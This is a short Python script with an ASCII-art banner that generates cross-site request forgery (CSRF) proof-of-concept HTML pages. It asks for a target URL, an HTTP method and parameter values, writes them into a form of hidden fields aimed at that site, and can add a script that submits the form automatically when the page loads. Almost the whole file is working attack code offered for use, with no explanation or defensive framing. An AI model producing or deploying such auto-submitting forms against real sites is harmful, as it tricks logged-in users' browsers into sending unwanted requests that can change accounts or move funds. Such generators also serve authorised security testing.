import urllib.parse
x="""
⠀⠀⠀⠀⠀⠀⢐⣿⣿⣿⣿⣿⡟⠉⠀⠀⣼⣿⢯⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠹⣿⣿⣿⠀⠈⠉⢿⣿⣿⣿⣿⣿⡍⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣏⢿⣿⣿⣿⣿⠇⠀⠀⢸⡿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⠻⣿⣇⠘⣿⣿⠀⢀⡀⢻⣿⣿⣿⣿⡿⢟⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⣿⡄⢻⣿⣿⣿⠀⠀⠀⢸⡇⣾⠋⣿⣿⡿⢁⣿⣿⡟⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢻⣿⣿⠀⠹⣿⡀⢻⣿⠴⠋⠀⢘⣿⣿⣿⣿⢷⣿⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣽⡄⢹⣿⣿⠀⠀⠀⠀⠧⡟⠀⣿⣿⠁⢸⣿⡏⠀⣿⡇⢻⣿⣿⣿⣿⣿⣿⡟⣿⡇⠀⢿⣿⠀⠀⢹⡧⣿⠁⠀⠀⠀⢨⣿⣿⣿⠃⣾⣽⣷⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡟⢸⡿⣾⣿⣿⡇⠀⠀⠀⠀⢹⡀⠈⣏⠀⠸⣿⠀⠀⢸⠛⣿⣿⣿⣿⣿⣿⠿⣳⣿⠀⠀⣸⣿⠀⢀⣼⠇⠀⠀⠀⠀⠀⠰⣿⣿⣿⣼⡍⠃⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣌⢧⣸⣿⠿⢧⠀⠀⠀⣀⠀⠁⠀⢻⠀⠀⣿⢦⠘⠾⣇⠹⣿⣿⡟⢻⡿⢰⠏⡟⠀⣼⣿⣧⠞⠉⠁⣀⣠⣀⣀⠀⢀⣰⠟⢻⣿⣻⣇⣴⡟⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⢯⠻⢿⣿⡆⠘⢿⣾⣿⣿⣿⣶⣤⣀⣀⣀⠀⣀⣀⡀⠈⠀⠸⣿⡇⣸⣷⠏⠘⠁⣀⣉⣀⣀⣤⣴⣾⣿⣿⣿⣿⣿⠟⠁⠀⣸⢋⡟⢫⡞⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⢳⣾⣯⡁⠀⠀⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣠⣿⡇⣿⣏⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⠿⠿⢿⣿⠁⠀⠀⠀⣿⣿⠇⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⠈⣧⠀⠀⠀⠀⢻⣿⣿⣷⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢷⣿⣿⣿⣿⣿⣿⡟⠛⠉⠛⠛⠁⠀⣠⣿⠃⠀⠀⠀⠀⣿⡇⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣿⡄⠀⠀⠀⠀⠻⣿⣻⣿⣿⡉⠉⢹⣿⣿⡿⠃⠘⠆⠀⠀⠸⠁⠈⠿⣿⣿⣶⣤⣤⣤⣴⣾⡿⠃⠀⠀⠀⠀⢠⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⠀⠈⠉⠉⠀⠀⠀⠀⢠⡀⠀⠀⢸⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⠀⡀⣼⢸⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣀⣀⣀⣀⣠⣄⡀⠀⢸⡄⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠓⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠀⣰⠇⢸⣶⣶⣿⣿⣿⣿⣷⣦⣄⠀⠀⠀
⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⡇⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⣤⡄⠀⠀⠀⠀⢀⣤⡤⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⢀⢺⣶⠏⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠈⢿⡄⠀⠀⢴⡶⠂⠀⠀⠀⠀⠀⢰⡋⠀⠀⠀⠀⠀⠀⢙⡆⠀⠀⠀⠀⠀⠀⢀⣼⠟⠀⠁⣸⡏⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣅⠀⠀⠻⣧⠀⠈⢿⣦⣄⠀⠀⠀⠀⠀⢻⣆⠀⠀⠀⠀⣰⡟⠁⠀⠀⠀⠀⣀⣴⠏⠀⠰⢆⣾⠟⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣆⠀⠀⠙⣧⡀⠈⢽⣿⣷⣤⣄⣀⣀⣈⣿⣷⣤⣴⣾⣟⣀⣀⣠⣤⣴⣾⣿⣣⠆⠀⢰⣾⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⠘⣿⡆⠘⢻⣿⣷⣏⠛⢿⠛⣿⠉⢽⡏⠀⣿⠁⢿⢃⣿⣿⡿⣱⣯⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⡿⣜⠿⣿⣾⣧⣼⣄⣰⣧⣠⣿⣴⣿⣿⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿              
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ Created By <𝕾𝖆𝖑𝖊7> 
"""
print(x)
#Name Of The File Input
Nfile=str(input("Enter The Name Of The File You Want To Write The Html-Code To:"))+".html"
# URL & Method input
URL=str(input("Please Enter the Url Of The Site:"))
Method=str(input("Please Enter the Method of This Request:"))
if "https://" in URL:
    Encodedurl=urllib.parse.unquote_plus(URL)
else:
    URL="https://"+URL
    Encodedurl=urllib.parse.unquote_plus(URL)
#--------------Writing-------------------
file1=open(Nfile,"a")
file1.write("""<html>
	<body>
		<form method="%s" action="%s">
"""%(Method.upper(),Encodedurl))

# Parameters & Values 
a=int(input("Please Enter The numebr of parameters in your request:"))
for i in range(1,a+1):
    Nparameter=str(input("please Enter the Name of the Parameter:"))
    VParameter=str(input("Please Enter The Value of the parameter:"))
    file1.write("""
        <input type="hidden" name="%s" value="%s"/>
"""%(Nparameter,VParameter))

##Closing Up The Html Code
file1.write("""
			<input type="submit" value="Submit">
		</form>
	</body>
</html>
""")    
##This is additonal Choice That if You Wanna Add A Js Script to your Csrf-Code To make it More Dynamic Without any interaction From the User
addchoice=int(input("Enter 1 If You wanna to add Js document.forms script otherwise enter 0:"))
if addchoice==1:
    file1.write("""
    <script>
            document.forms[0].submit();
    </script>
    """)
    file1.close()
elif addchoice==0:
    file1.close()
print("""
###CSRF-HTML-Code Has been Created Successfully####
""")
